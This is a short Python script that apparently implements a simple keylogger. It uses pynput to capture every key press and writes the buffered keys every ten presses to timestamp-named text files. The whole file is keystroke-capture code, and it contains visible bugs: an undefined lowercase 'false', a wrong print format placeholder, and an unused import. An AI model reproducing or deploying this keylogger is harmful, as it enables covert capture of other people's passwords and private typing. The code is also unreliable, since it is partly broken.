
import os
import pynput 
import scipy
import time
import datetime
from datetime import date

from pynput.keyboard import Key , Listener


counter= 0 
character_array = []

def write_file(character_array):
    today = str(datetime.datetime.now())
    #name = str(today.strtime("%Y-%m-%d %H:%M"))

    with open("%s.txt" % today, "w") as f:
    #with open("output.txt", "w") as f:
    
        for character in character_array:
            f.write(str(character))


def on_press(key):
    global character_array, counter 
    character_array.append(key)
    counter +=1
     
    print("[0] pressed".format(key))
    
    if counter >=10:
        counter = 0 
        write_file(character_array)


def on_release(key):
    if key == Key.esc:
        return false
#do some more research play around with listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


